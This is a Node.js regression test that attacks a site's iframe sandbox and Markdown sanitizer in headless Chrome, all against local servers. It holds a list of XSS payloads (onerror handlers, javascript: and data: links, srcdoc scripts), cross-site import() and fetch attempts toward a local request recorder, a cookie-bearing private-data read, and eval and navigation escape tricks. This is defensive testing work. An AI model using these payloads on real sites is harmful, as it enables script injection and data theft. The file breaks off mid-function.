#!/usr/bin/env node
/* Attacks on the sandbox, from a piece's point of view: a regression test for docs/sandbox.md and the spec's section 10.
 *
 *   node scripts/check-sandbox.mjs [--browser <path>] [--shots <dir>] [--only <part,…>] [--verbose]
 *   (parts: headers, attacks, explanations, registry, catalog, fonts, kill, crash)
 *
 * Starts the real demo server (dev mode, a throwaway database) and a plain static server for the same files, plus a
 * little "other site" that records every request it receives. Everything binds to 127.0.0.1. Then, in headless Chrome,
 * it runs hostile pieces (entries/<slug>.js in the submission format) and hostile explanations against both, and
 * checks that the catalog still draws, that the kill switch stops a piece and that a crashed tab skips one (the crash
 * is real: the renderer processes are killed). No npm dependencies beyond the demo's own; needs Node 22+.
 * Exit code: 0 all passed, 1 a check failed, 2 the harness could not run. */
import { createServer } from 'node:http';
import { spawn, execFileSync } from 'node:child_process';
import { readFileSync, readdirSync, existsSync, statSync, mkdtempSync, rmSync, writeFileSync, mkdirSync } from 'node:fs';
import { join, dirname, resolve, extname, sep } from 'node:path';
import { createRequire } from 'node:module';
import { tmpdir } from 'node:os';
import { fileURLToPath } from 'node:url';

const ROOT = resolve(dirname(fileURLToPath(import.meta.url)), '..');
const require = createRequire(import.meta.url);
const ENTRIES = join(ROOT, 'demo/github/registry/entries');
const args = process.argv.slice(2), flag = n => args.includes(n), opt = n => { const i = args.indexOf(n); return i >= 0 ? args[i + 1] : undefined; };
const verbose = flag('--verbose'), shots = opt('--shots');
const die = m => { console.error(`check-sandbox: ${m}`); process.exit(2); };
const sleep = ms => new Promise(r => setTimeout(r, ms));
const TMP = mkdtempSync(join(tmpdir(), 'eigenreel-sandbox-'));
if (shots) mkdirSync(shots, { recursive: true });

function findBrowser() {
  for (const c of [opt('--browser'), process.env.CHROME, '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome', 'chromium', 'chromium-browser', 'google-chrome', 'google-chrome-stable']) {
    if (!c) continue;
    if (c.includes('/')) { if (existsSync(c)) return c; continue; }
    try { return execFileSync('which', [c], { encoding: 'utf8' }).trim(); } catch { /* not on PATH */ }
  }
  return null;
}
const exe = findBrowser(); if (!exe) die('no Chrome or Chromium found (pass --browser <path> or set CHROME)');

/* ---------- servers ---------- */
const listen = s => new Promise(r => s.listen(0, '127.0.0.1', () => r(s.address().port)));
const hits = [];
const otherPort = await listen(createServer((q, r) => { hits.push(q.url); r.writeHead(200, { 'content-type': q.url.includes('json') ? 'application/json' : 'text/javascript', 'access-control-allow-origin': '*' }); r.end(q.url.includes('json') ? '{}' : 'export default 1;'); }));
const OTHER = `http://127.0.0.1:${otherPort}`;
const TYPES = { '.html': 'text/html', '.js': 'text/javascript', '.css': 'text/css', '.json': 'application/json', '.wasm': 'application/wasm', '.md': 'text/markdown', '.png': 'image/png', '.svg': 'image/svg+xml', '.c': 'text/plain', '.sh': 'text/plain' };
// As static files: no headers at all, and a fake private JSON file standing in for an API that takes a cookie.
const staticPort = await listen(createServer((q, res) => {
  const u = new URL(q.url, 'http://x');
  if (u.pathname === '/private.json') { res.writeHead(200, { 'content-type': 'application/json' }); return res.end('{"secret":"FAKE"}'); }
  const rel = u.pathname === '/' ? 'index.html' : u.pathname.slice(1), p = resolve(ROOT, rel);
  if (!p.startsWith(ROOT + sep) || p.slice(ROOT.length).includes(`${sep}.`) || !existsSync(p) || !statSync(p).isFile()) { res.writeHead(404); return res.end('not found'); }
  res.writeHead(200, { 'content-type': TYPES[extname(p)] || 'application/octet-stream' }); res.end(readFileSync(p));
}));
const serverPort = await listen(createServer()).then(p => p); // a free port for the demo server
const SERVER = `http://127.0.0.1:${serverPort + 1}`, STATIC = `http://127.0.0.1:${staticPort}`;
const server = spawn(process.execPath, ['server/index.js'], { cwd: join(ROOT, 'demo'), stdio: verbose ? 'inherit' : 'ignore', env: { ...process.env, AUTH_MODE: 'dev', DEV_LOGIN: 'admin@example.com', PORT: String(serverPort + 1), DATA_DIR: join(TMP, 'data'), REGISTRY_REPO: '' } });
for (let i = 0; ; i++) { try { if ((await fetch(`${SERVER}/api/whoami`)).ok) break; } catch { /* starting */ } if (i > 50) die('the demo server did not start'); await sleep(200); }

/* ---------- the browser ---------- */
const chrome = spawn(exe, ['--headless=new', '--remote-debugging-port=0', `--user-data-dir=${join(TMP, 'profile')}`, '--no-first-run', '--no-default-browser-check', '--window-size=1280,900', '--use-angle=swiftshader', '--enable-unsafe-swiftshader', '--disable-background-timer-throttling', '--disable-renderer-backgrounding', '--disable-backgrounding-occluded-windows', 'about:blank'], { stdio: ['ignore', 'ignore', 'pipe'] });
const cleanup = () => { try { chrome.kill('SIGKILL'); } catch {} try { server.kill('SIGKILL'); } catch {} try { rmSync(TMP, { recursive: true, force: true }); } catch {} };
process.on('exit', cleanup);
setTimeout(() => die('the checks did not finish within 10 minutes'), +(opt('--timeout') || 600) * 1000).unref();
const wsURL = await new Promise((res, rej) => { let b = ''; chrome.stderr.on('data', d => { b += d; const m = b.match(/DevTools listening on (ws:\/\/\S+)/); if (m) res(m[1]); }); chrome.on('exit', c => rej(new Error(`browser exited (${c})`))); }).catch(e => die(e.message));
const cdpPort = new URL(wsURL).port;
/* one command on the browser's own connection */
async function browserCall(method, params = {}) {
  const ws = new WebSocket(wsURL); await new Promise((r, j) => { ws.onopen = r; ws.onerror = j; });
  const m = await new Promise(r => { ws.onmessage = e => { const x = JSON.parse(e.data); if (x.id === 1) r(x); }; ws.send(JSON.stringify({ id: 1, method, params })); setTimeout(() => r({}), 10000); });
  ws.close(); return m;
}
async function open(url, { init } = {}) {
  const t = await (await fetch(`http://127.0.0.1:${cdpPort}/json/new?about:blank`, { method: 'PUT' })).json();
  let ws, sid, id = 0; const wait = new Map(), errors = [], events = new Map();
  const onmessage = e => { const m = JSON.parse(e.data); if (m.id && wait.has(m.id)) { wait.get(m.id)(m); wait.delete(m.id); } if (m.sessionId !== sid) return;
    if (m.method === 'Runtime.exceptionThrown') errors.push(m.params.exceptionDetails.exception?.description || m.params.exceptionDetails.text);
    if (verbose && m.method === 'Runtime.consoleAPICalled') console.error('[page]', m.params.args.map(a => a.value ?? a.description ?? '').join(' ').slice(0, 300));
    const l = events.get(m.method); if (l) l.forEach(f => f(m.params)); };
  const send = (method, params = {}) => new Promise(r => { const i = ++id; const to = setTimeout(() => { if (wait.delete(i)) { if (verbose) console.error('cdp: no answer to', method); r({ error: { message: `${method}: no answer` } }); } }, 20000); wait.set(i, m => { clearTimeout(to); r(m); }); try { ws.send(JSON.stringify({ id: i, method, params, sessionId: sid })); } catch { /* the socket is gone */ } });
  /* (re)attach to the tab, through the browser's own connection: after Page.crash the old session answers nothing */
  const attach = async (crashed) => {
    try { if (ws) ws.close(); } catch { }
    ws = new WebSocket(wsURL); ws.onmessage = onmessage; sid = undefined; await new Promise((r, j) => { ws.onopen = r; ws.onerror = j; });
    sid = (await send('Target.attachToTarget', { targetId: t.id, flatten: true })).result?.sessionId;
    if (crashed) { send('Page.enable'); send('Runtime.enable'); return; } // a crashed tab answers once it has a renderer again
    await send('Page.enable'); await send('Runtime.enable');
    if (init) await send('Page.addScriptToEvaluateOnNewDocument', { source: init });
  };
  await attach();
  // a load that never fires gives up after 15 s
  const go = u => new Promise(async r => { let to; const f = () => { clearTimeout(to); events.delete('Page.loadEventFired'); r(); }; events.set('Page.loadEventFired', [f]); to = setTimeout(f, 15000); await send('Page.navigate', { url: u }); });
  await go(url);
  const ev = async x => { const m = await send('Runtime.evaluate', { expression: x, awaitPromise: true, returnByValue: true }); if (m.result?.exceptionDetails) throw new Error(m.result.exceptionDetails.exception?.description || m.result.exceptionDetails.text); return m.result?.result?.value; };
  const shot = async name => { if (!shots) return; const m = await send('Page.captureScreenshot', { format: 'png' }); writeFileSync(join(shots, name + '.png'), Buffer.from(m.result.data, 'base64')); };
  return { ev, go, send, shot, errors, attach, on: (n, f) => events.set(n, [f]), close: async () => { await fetch(`http://127.0.0.1:${cdpPort}/json/close/${t.id}`).catch(() => {}); try { ws.close(); } catch { } } };
}

/* ---------- the report ---------- */
let failed = 0, total = 0;
const check = (name, ok, detail) => { total++; if (!ok) failed++; console.log(`  ${ok ? 'pass' : 'FAIL'}  ${name}${!ok && detail !== undefined ? `\n        ${typeof detail === 'string' ? detail : JSON.stringify(detail)}` : ''}`); };
const until = async (f, ms = 8000) => { const t = Date.now(); for (;;) { const v = await f(); if (v || Date.now() - t > ms) return v; await sleep(100); } };

/* ---------- hostile pieces ----------
   A piece in the submission format, mounted with EigenReelHost directly. It reports what it saw by throwing
   'R:' + JSON from draw (the host passes the message on as an 'error'), since it has no other way out. */
const TAG = label => label.replace(/\W/g, '');
const PIECE_HEAD = `const COLORS = { main: '#ff0000', secondary: '#00ff00', bg: '#000000', fg: '#ffffff' };\n`;
const REPORT = `draw(ctx, t, params, env, S) { ctx.fillStyle = env.colors.fg; ctx.fillRect(0, 0, 10, 10); throw new Error('R:' + JSON.stringify(R)); }`;
const HARNESS = `window.__run=(source,ms,o={})=>new Promise(res=>{
  const c=document.createElement('canvas'); c.style.cssText='position:fixed;left:0;top:0;width:400px;height:300px;z-index:9999'; document.body.append(c);
  const out={errors:[],params:[],dropped:[],leaves:[]};
  const meta={title:'t', time:{length:24, loop:true}, context:'2d', params:o.params||[], presets:[], libraries:[], modes:{desktop:true, phone:true}, interact:o.interact?{hint:'x'}:null};
  const h=EigenReelHost.mount(c,{slug:'attack-'+Math.random().toString(36).slice(2), source, meta, colors:{main:'#ff0000', secondary:'#00ff00', bg:'#000000', fg:'#ffffff'}, ...(o.wasm?{wasm:o.wasm}:{})},
    {params:{}, t:0, playing:true, device:'desktop', mode:o.interact?'interact':'feed', box:{x:0,y:0,w:400,h:300}, dpr:1, label:o.label||'checker',
     onError:(k,m)=>out.errors.push(k+': '+m), onParam:(k,v)=>out.params.push([k,v]), onUIDropped:w=>out.dropped.push(w), onLeave:w=>out.leaves.push(w)});
  setTimeout(()=>{ out.state=h.state; const r=out.errors.map(e=>e.indexOf('R:')>=0?e.slice(e.indexOf('R:')+2):null).find(Boolean); try{ out.R=r?JSON.parse(r):{}; }catch(_){ out.R={unparsed:r}; }
    h.dispose(); c.remove(); res(out); },ms);
});`;
const GONE = ['fetch', 'XMLHttpRequest', 'WebSocket', 'EventSource', 'WebTransport', 'importScripts', 'Worker', 'SharedWorker', 'BroadcastChannel', 'indexedDB', 'caches', 'eval', 'FontFace', 'setTimeout', 'setInterval', 'requestAnimationFrame', 'RTCPeerConnection', 'SharedArrayBuffer', 'localStorage', 'sessionStorage'];

async function attacks(base, label, privateUrl) {
  console.log(`\nHostile pieces, ${label}:`);
  const tag = TAG(label), p = await open(`${base}/`); await p.ev(HARNESS);
  await until(() => p.ev('typeof EigenReelHost==="object"'));
  const run = (src, ms, o) => p.ev(`__run(${JSON.stringify(PIECE_HEAD + src)},${ms},${JSON.stringify(o || {})})`);
  // what the piece can reach
  const r = await run(`const R = {};
export default {
  setup(env, S) {
    R.origin = self.origin; R.page = typeof window !== 'undefined' || typeof parent !== 'undefined' || typeof top !== 'undefined' || !!(self.document && self.document.cookie);
    R.left = []; for (const k of ${JSON.stringify(GONE)}) for (let o = self; o; o = Object.getPrototypeOf(o)) { let v; try { v = o[k]; } catch (_) { continue; } if (v) { R.left.push(k); break; } }
    try { (() => {}).constructor('return 1')(); R.fn = 'ran'; } catch (e) { R.fn = e.name; }
    try { (async () => {}).constructor('return 1'); R.afn = 'ran'; } catch (e) { R.afn = e.name; }
    try { self.location.href = ${JSON.stringify(`${OTHER}/nav-href?${tag}`)}; R.nav = 'assigned'; } catch (e) { R.nav = e.name; }
    try { top.location = ${JSON.stringify(`${OTHER}/nav-top?${tag}`)}; R.top = 'assigned'; } catch (e) { R.top = e.name; }
    try { self.postMessage({ type: 'eigenreel:ready' }); self.postMessage({ type: 'ui', ops: [['create', 99, 'iframe', 'html']] }); R.post = 'sent'; } catch (e) { R.post = e.name; }
  },
  ${REPORT}
};`, 2500);
  const v = r.R || {};
  check('runs in an opaque origin', v.origin === 'null', r);
  check('no page objects', v.page === false, v);
  check('network, storage, timers and eval are gone, on the prototype chain too', Array.isArray(v.left) && v.left.length === 0, v.left);
  check('new Function is refused', v.fn === 'EvalError' && v.afn === 'EvalError', v);
  check('no navigation: location.href= and top.location do nothing', !r.errors.some(e => e.startsWith('navigated')) && !hits.some(h => h.includes('nav-')), { nav: v.nav, top: v.top, errors: r.errors });
  check('the page did not move', await p.ev(`location.href`) === `${base}/`);
  // loading code or data from elsewhere
  const imp = async (what, src) => { const x = await run(src, 2000); return { what, errors: x.errors, state: x.state }; };
  const loads = [
    await imp('import() of another site', `export default { async setup() { await import/**/(${JSON.stringify(`${OTHER}/code.js?${tag}`)}); }, draw() {} };`),
    await imp('import() of JSON from another site', `export default { async setup() { await import/**/(${JSON.stringify(`${OTHER}/data.json?${tag}`)}, { with: { type: 'json' } }); }, draw() {} };`),
    await imp('import() of this site with the viewer’s cookies', `export default { async setup() { await import/**/(${JSON.stringify(privateUrl)}, { with: { type: 'json' } }); }, draw() {} };`),
    await imp('a static import from another site', `import x from ${JSON.stringify(`${OTHER}/static.js?${tag}`)};\nexport default { draw() {} };`),
    await imp('fetch through a saved reference', `const f = self['fet' + 'ch'];\nexport default { async setup() { await f(${JSON.stringify(`${OTHER}/fetch?${tag}`)}); }, draw() {} };`),
    await imp('eval', `export default { setup() { (0, self['ev' + 'al'])('1'); }, draw() {} };`),
  ];
  check('every way of loading code or data fails with an error', loads.every(x => x.errors.some(e => e.startsWith('error'))), loads);
  check('the other site received nothing', !hits.some(h => h.includes(tag)), hits);
  // the watchdog: 250 ms a call once the first frames are out (the first three get the setup budget, 8 s)
  const stuck = await p.ev(`(async()=>{ let beats=0; const id=setInterval(()=>beats++,50); const r=await __run(${JSON.stringify(PIECE_HEAD + `export default { setup(env, S) { S.n = 0; }, draw(ctx, t, params, env, S) { if (++S.n < 6) return; try { self.postMessage({ type: 'beat', t: 0, ms: 0, drawn: true }); } catch (_) {} for (;;); } };`)},2500); clearInterval(id); return {...r,beats}; })()`);
  check('an endless loop that forges heartbeats is stopped', stuck.errors.some(e => e.startsWith('stalled')), stuck);
  check('and the page stays responsive meanwhile', stuck.beats > 30, stuck.beats);
  const mem = await run(`export default { draw(ctx, t, params, env, S) { if (!S.m) S.m = new WebAssembly.Memory({ initial: 1 }); if (S.m.buffer.byteLength < 80 * 1048576) S.m.grow(1300); } };`, 3000);
  check('a WebAssembly memory over 64 MiB is stopped', mem.errors.some(e => e.startsWith('memory')), mem.errors);
  const timers = await run(`setTimeout(() => {}, 20);\nexport default { draw() {} };`, 1500);
  check('code outside draw() has no timers to run on', timers.errors.some(e => e.startsWith('error')), timers.errors);
  const portGrab = await run(`const R = { grabbed: false }; const d = Object.getOwnPropertyDescriptor(MessageEvent.prototype, 'data'); Object.defineProperty(MessageEvent.prototype, 'data', { get() { if (this.target && this.target.postMessage) R.grabbed = true; return d.get.call(this); } });
export default { setup(env, S) { S.n = 0; }, draw(ctx, t, params, env, S) { if (++S.n > 20) throw new Error('R:' + JSON.stringify(R)); } };`, 2000);
  check('a patched MessageEvent cannot reach the page’s port', portGrab.R && portGrab.R.grabbed === false, portGrab);
  const htmlErr = await run(`export default { draw() { throw new Error('<img src=x onerror="window.__xss=3">'); } };`, 1000);
  check('an error message stays text in the host', htmlErr.errors.some(e => e.includes('<img')) && await p.ev('window.__xss||null') === null, htmlErr);
  // env.ui: only the allowlist reaches the frame
  const ui = await run(`const R = {};
export default {
  onMode(env) {
    if (!env.ui) return;
    const img = document.createElement('img'); img.setAttribute('src', ${JSON.stringify(`${OTHER}/img?${tag}`)}); env.ui.appendChild(img);
    const a = document.createElement('a'); a.setAttribute('href', ${JSON.stringify(`${OTHER}/a?${tag}`)}); env.ui.appendChild(a);
    const f = document.createElement('iframe'); env.ui.appendChild(f);
    const d = document.createElement('div'); d.textContent = 'hi';
    d.style.background = ${JSON.stringify(`url(${OTHER}/bg?${tag})`)}; d.style.cssText = ${JSON.stringify(`color: red; background-image: url(${OTHER}/bg2?${tag})`)};
    d.style.setProperty('border-image', ${JSON.stringify(`image-set("${OTHER}/bg3?${tag}" 1x)`)}); d.style.position = 'fixed';
    d.setAttribute('onclick', 'parent.__xss=4'); d.setAttribute('href', 'javascript:parent.__xss=5'); d.setAttribute('srcdoc', '<script>parent.__xss=6</script>');
    d.innerHTML = ${JSON.stringify(`<img src="${OTHER}/inner?${tag}">`)};
    env.ui.appendChild(d);
    const b = document.createElement('button'); b.setAttribute('type', 'submit'); b.setAttribute('formaction', ${JSON.stringify(`${OTHER}/form?${tag}`)}); env.ui.appendChild(b);
    R.built = true;
  },
  setup(env, S) { S.n = 0; },
  draw(ctx, t, params, env, S) { if (++S.n > 30) throw new Error('R:' + JSON.stringify(R)); },
};`, 2500, { interact: true });
  const dropped = ui.dropped.join(' | ');
  check('env.ui: an img, a link and an iframe are dropped', ['element img', 'element a', 'element iframe'].every(x => dropped.includes(x)), ui.dropped);
  check('env.ui: url(), image-set() and position: fixed are dropped', /style background/.test(dropped) && /image-set|border-image/.test(dropped) && /position/.test(dropped), ui.dropped);
  check('env.ui: onclick, href, srcdoc, formaction and innerHTML are dropped', ['attribute onclick', 'attribute href', 'attribute srcdoc', 'attribute formaction', 'innerHTML'].every(x => dropped.includes(x)), ui.dropped);
  check('env.ui: nothing reached the other site and no script ran', ui.R && ui.R.built && !hits.some(h => h.includes(tag)) && await p.ev('window.__xss||null') === null, { R: ui.R, hits, errors: ui.errors });
  await p.close();
}

/* ---------- hostile explanations ---------- */
const XSS = [
  '<img src=x onerror="window.__xss=1">', '<svg onload="window.__xss=1"></svg>', '<script>window.__xss=1</script>',
  '[click](javascript:window.__xss=1)', '[click](JaVaScRiPt:window.__xss=1)', '[click](data:text/html,<script>window.__xss=1</script>)',
  '<a href="javascript:window.__xss=1" data-act="share">x</a>', '<iframe srcdoc="<script>parent.__xss=1</script>"></iframe>',
  '<details open ontoggle="window.__xss=1">x</details>', '<style>body{display:none}</style>', '![pixel](https://example.invalid/pixel.png)',
  '<form action="https://example.invalid"><button>x</button></form>', '<div id="feed" class="stall" style="position:fixed;inset:0" data-close-modal="1">spoof</div>',
  'Math with a link: $\\href{javascript:window.__xss=1}{x}$ and $\\url{javascript:window.__xss=1}$ and $\\htmlId{feed}{y}$.',
].join('\n\n');
async function explanations(base, label) {
  console.log(`\nHostile explanations, ${label}:`);
  const p = await open(`${base}/`);
  await until(() => p.ev('typeof md==="function" && !!window.DOMPurify'));
  // the sanitized HTML is judged before KaTeX typesets it (KaTeX's own output has inline styles); links and scripts after
  const r = await p.ev(`(async()=>{ const el=document.createElement('article'); el.className='md'; document.body.append(el); el.innerHTML=md(touchCopy(${JSON.stringify('# Title\n\nSome *text* with [a link](https://example.com), a [preset link](#preset:eight), a [time link](#t:3) and $x^2$.\n\n' + XSS)}));
    const html=el.innerHTML;
    if(window.EigenReelTeX) await EigenReelTeX.typeset(el).catch(()=>{}); await new Promise(r=>setTimeout(r,800));
    const hrefs=[...el.querySelectorAll('a[href]')].map(a=>a.getAttribute('href'));
    el.remove(); return {xss:window.__xss||null, html, hrefs, hasMath:/class="tex/.test(html), hasEm:/<em>text<\\/em>/.test(html)}; })()`);
  check('no script ran', r.xss === null, r.xss);
  check('no event handlers, styles, ids, forms, frames, images or data-* survive', !/onerror|onload|ontoggle|<script|<svg|<img|<iframe|<form|<style|style=|\bid=|data-act|data-close/i.test(r.html), r.html.slice(0, 2000));
  check('no javascript: or data: link survives, in Markdown or in TeX', r.hrefs.every(h => /^(https?:|#)/.test(h)), r.hrefs);
  check('ordinary Markdown, live links and math still work', r.hasEm && r.hasMath && r.hrefs.includes('https://example.com') && r.hrefs.includes('#preset:eight') && r.hrefs.includes('#t:3'), { hrefs: r.hrefs, hasEm: r.hasEm, hasMath: r.hasMath });
  const off = await p.ev(`(()=>{ const D=window.DOMPurify; window.DOMPurify=undefined; const h=md('<img src=x onerror="window.__xss=2">'); window.DOMPurify=D; return h; })()`);
  check('without the sanitizer, the raw text is shown and no HTML', off.startsWith('<pre class="raw">') && off.includes('&lt;img'), off);
  await p.close();
}

/* ---------- a registry entry with HTML in every field ---------- */
async function registryFuzz() {
  console.log('\nA registry entry with HTML in every field, on the server:');
  const H = '<img src=x onerror=__xss=1>';
  globalThis.acorn = require(join(ROOT, 'vendor/acorn.js'));
  const Spec = require(join(ROOT, 'spec.js'));
  const code = readFileSync(join(ROOT, 'demo/github/registry/entries/rose-curves.js'), 'utf8'), rd = Spec.read(code);
  const meta = JSON.parse(JSON.stringify(rd.meta));
  meta.title = H + ' title'; meta.hook = H + ' hook'; meta.alt = H + ' alt text that is long enough to count'; meta.author = { name: H.slice(0, 40) };
  for (const q of meta.params || []) q.label = H;
  for (const s of meta.presets || []) s.label = H;
  if (meta.interact) meta.interact.hint = H.slice(0, 40);
  const md = `## What you're seeing\n\n${H}\n\n## Try this\n\n${H} [x](#preset:eight)\n\n**Reference.** ${H}\n`;
  const item = { id: 999, slug: 'fuzz-piece', title: meta.title, hook: meta.hook, license: 'MIT', tags: meta.tags, colors: rd.colors, meta, code, explanation: md, wasm: null,
    createdAt: '2026-10-01 00:00:00', registryPr: 1, registryPath: 'entries/fuzz-piece.js"><img src=x onerror=__xss=1>', author: { handle: 'fuzz"><img src=x onerror=__xss=1>', avatar: 'javascript:__xss=1', github: 1 }, likes: 0 };
  const init = `(()=>{ const f=window.fetch; window.fetch=async function(u,o){ const r=await f.apply(this,arguments); if(String(u).endsWith('api/registry')){ const j=await r.clone().json(); j.singles=[...(j.singles||[]),${JSON.stringify(item)}]; return new Response(JSON.stringify(j),{status:200,headers:{'content-type':'application/json'}}); } return r; }; })();`;
  const p = await open(`${SERVER}/?v=fuzz-piece`, { init });
  const shown = await until(() => p.ev(`typeof VIZ!=='undefined' && VIZ.some(v=>v.id==='fuzz-piece')`), 8000);
  check('the entry reached the feed', !!shown);
  await sleep(1500);
  for (const tab of ['explain', 'customize', 'settings']) { await p.ev(`(()=>{ try{ openDrawer(${JSON.stringify(tab)},VIZ.find(v=>v.id==='fuzz-piece')); }catch(_){} })()`); await sleep(300); }
  const opened = await p.ev(`!!document.querySelector('#d-body') && document.querySelector('#d-body').innerHTML.length>0`);
  check('its drawer opened', opened);
  await p.ev(`document.querySelector('#d-close')&&document.querySelector('#d-close').click()`); await sleep(200);
  for (const t of ['browse', 'submit', 'admin', 'feed']) { await p.ev(`document.querySelector('#tab-${t}').click()`).catch(() => {}); await sleep(500); }
  const r = await p.ev(`({xss:window.__xss||null, live:[...document.querySelectorAll('img[onerror]')].map(i=>i.parentElement.outerHTML.slice(0,200)+' IN '+(i.closest('[id]')||{}).id)})`);
  check('no field became HTML', r.xss === null && r.live.length === 0, r);
  await p.close();
}

/* ---------- the site still works ---------- */
async function catalog(base, label) {
  console.log(`\nThe catalog, ${label}:`);
  const p = await open(`${base}/`);
  await until(() => p.ev('typeof VIZ!=="undefined" && typeof pieceOf==="function" && typeof EigenReelHost==="object"'));
  await sleep(1500); await p.shot(`feed-${label}`);
  const place = await until(() => p.ev(`(()=>{ const f=document.querySelector('.stage iframe[sandbox]'); if(!f) return null; const c=f.nextElementSibling, a=f.getBoundingClientRect(), b=c.getBoundingClientRect(); return {sandbox:f.getAttribute('sandbox'), sameBox:Math.abs(a.left-b.left)<1&&Math.abs(a.top-b.top)<1&&Math.abs(a.width-b.width)<1&&Math.abs(a.height-b.height)<1, events:getComputedStyle(f).pointerEvents, n:document.querySelectorAll('iframe[sandbox]').length, w:b.width}; })()`));
  check('the first slide runs in a sandboxed frame, exactly under its canvas', place && place.sandbox === 'allow-scripts' && place.sameBox && place.events === 'none' && place.w > 0, place);
  check('at most three live frames in the feed', place && place.n <= 4, place);
  // every catalog piece, in the submission format: its own source and the metadata spec.js read from it. A catalog
  // without them (an older catalog.js) falls back to the entries in the registry folder.
  const fallback = Object.fromEntries(readdirSync(ENTRIES).filter(n => n.endsWith('.js')).map(n => [n.slice(0, -3), readFileSync(join(ENTRIES, n), 'utf8')]));
  const res = await p.ev(`(async()=>{ const FB=${JSON.stringify(fallback)}, out=[];
    const list=VIZ.some(v=>typeof v.source==='string'&&v.meta)?VIZ.map(v=>({id:v.id, piece:pieceOf(v), params:getSettings(v).params})):Object.entries(FB).map(([id,source])=>{ const r=EigenReelSpec.read(source); return {id, piece:{slug:id, source, meta:r.meta, colors:r.colors}, params:EigenReelSpec.normalizeParams(r.meta,{})}; });
    for(const x of list){ const box={x:0,y:0,w:300,h:220};
      if(x.piece.meta && x.piece.meta.context==='webgl2' && !EigenReelHost.hasWebGL2()){ out.push({id:x.id, skip:'no webgl2'}); continue; }
      try{ const b=await Promise.race([EigenReelHost.poster(x.piece,{w:300,h:220,dpr:1,box,params:x.params,t:3,device:'desktop',site:typeof siteColors==='function'?siteColors():undefined}),new Promise((_,j)=>setTimeout(()=>j(new Error('timeout')),15000))]);
        const bm=await createImageBitmap(b), c=new OffscreenCanvas(bm.width,bm.height).getContext('2d'); c.drawImage(bm,0,0); const d=c.getImageData(0,0,bm.width,bm.height).data; const first=[d[0],d[1],d[2]]; let diff=0; for(let i=0;i<d.length;i+=4) if(Math.abs(d[i]-first[0])+Math.abs(d[i+1]-first[1])+Math.abs(d[i+2]-first[2])>20) diff++;
        out.push({id:x.id, ink:diff/(d.length/4)}); }catch(e){ out.push({id:x.id, err:e.message}); } }
    return {from:VIZ.some(v=>typeof v.source==='string'&&v.meta)?'catalog.js':'the registry entries', out}; })()`);
  const bad = res.out.filter(x => x.err || (!x.skip && x.ink < 0.001));
  check(`all ${res.out.length} pieces draw in the sandbox (from ${res.from})`, bad.length === 0 && res.out.length > 0, bad);
  if (verbose) console.error(res);
  const left = await until(() => p.ev(`document.querySelectorAll('iframe[sandbox][style*="display: none"]').length===0`));
  check('hidden frames go away after use', left);
  // the Chalkboard's stage: every way out of the editor stops its piece and gives its frame back
  if (await p.ev(`typeof copyToChalkboard==='function'`)) {
    const live = `document.querySelectorAll('#chalkboard iframe[sandbox]:not([style*="display: none"]):not([style*="visibility: hidden"])').length`;
    const leaves = { 'the Feed tab': `document.querySelector('#tab-feed').click()`, 'the Browse tab': `document.querySelector('#tab-browse').click()` };
    if (await p.ev(`!!document.querySelector('[data-cb-back]')`)) leaves['the back link'] = `document.querySelector('[data-cb-back]').click()`;
    for (const [how, go] of Object.entries(leaves)) {
      await p.ev(`copyToChalkboard(VIZ[0])`);
      const before = await until(() => p.ev(live), 4000);
      await p.ev(go);
      const after = await until(async () => (await p.ev(live)) === 0, 3000) ? 0 : await p.ev(live);
      check(`leaving the Chalkboard by ${how} stops its stage`, before >= 1 && after === 0, { before, after });
    }
    await p.ev(`document.querySelector('#tab-feed').click()`); await sleep(100);
  }
  check('no trusted flag and no main-page fallback', await p.ev(`EigenReelHost.forceFallback===undefined && pieceOf(VIZ[0]).trusted===undefined`));
  await p.close();
  const em = await open(`${base}/?embed=1&v=elliptic-group-law`);
  await until(() => em.ev(`!!document.querySelector('.e-stage.e-still')`), 5000); await sleep(1000);
  await em.ev(`document.querySelector('.e-stage').click()`);
  check('embed mode draws a still, then runs in a sandboxed frame when played', await until(() => em.ev(`!!document.querySelector('.e-stage iframe[sandbox]:not([style*="display: none"])') && !!document.querySelector('.e-stage canvas.viz')`), 8000));
  await sleep(600); await em.shot(`embed-${label}`); await em.close();
}
async function fonts(base) {
  console.log('\nFonts, with no network in the sandbox:');
  const p = await open(`${base}/`); await p.ev(HARNESS); await until(() => p.ev('typeof EigenReelHost==="object"'));
  const fam = await p.ev(`getComputedStyle(document.documentElement).getPropertyValue('--f-body')`);
  const first = String(fam).split(',')[0].replace(/['"]/g, '').trim();
  const r = await p.ev(`__run(${JSON.stringify(PIECE_HEAD + `const R = {};\nexport default { setup(env) { R.font = env.font; }, ${REPORT} };`)},5000)`);
  check(`the site's font (${first}) reaches the piece once its bytes arrive`, !!first && String(r.R.font).includes(first), r.R);
  await p.close();
}

/* ---------- the kill switch ---------- */
async function killSwitch() {
  console.log('\nThe kill switch, on the server:');
  const p = await open(`${SERVER}/`);
  await until(() => p.ev(`!!document.querySelector('.stage iframe[sandbox]')`));
  const first = await p.ev(`slides[activeIdx].v.id`);
  const call = (m, path, body) => p.ev(`fetch(${JSON.stringify(path)},{method:${JSON.stringify(m)},headers:{'x-eigenreel':'1','content-type':'application/json'},body:${JSON.stringify(JSON.stringify(body || {}))}}).then(r=>r.status)`);
  check('an admin can stop a piece', await call('PUT', `api/admin/blocked/${first}`, { reason: 'test' }) === 200);
  check('a reason is required', await call('PUT', `api/admin/blocked/${first}`, {}) === 400);
  await p.ev(`EigenReelAPI.readBlocked()`);
  const r = await until(() => p.ev(`(()=>{ const s=slides[activeIdx], card=s.el.querySelector('.stall'); return card?{text:card.textContent, frame:!!s.el.querySelector('iframe[sandbox]'), restart:!!card.querySelector('[data-act="restart"]')}:null; })()`));
  check('the running piece stops at once and shows why', r && /stopped/.test(r.text), r);
  check('its picture goes too, and it offers no restart', r && !r.restart && await until(() => p.ev(`!slides[activeIdx].el.querySelector('iframe[sandbox]')`), 2000), r);
  await p.shot('stopped');
  await p.ev(`openDrawer('explain',slides[activeIdx].v)`);
  check('its explanation is hidden', await until(() => p.ev(`/was stopped/.test(document.querySelector('#d-body').textContent) && !document.querySelector('#d-body .md')`), 2000));
  await p.ev(`document.querySelector('#d-close').click()`);
  const anon = await fetch(`${SERVER}/api/blocked`).then(x => x.json());
  check('signed-out browsers can read the list', anon.items.some(x => x.id === first), anon);
  const p2 = await open(`${SERVER}/`); await until(() => p2.ev(`typeof slides!=='undefined' && slides.length>0`)); await sleep(1200);
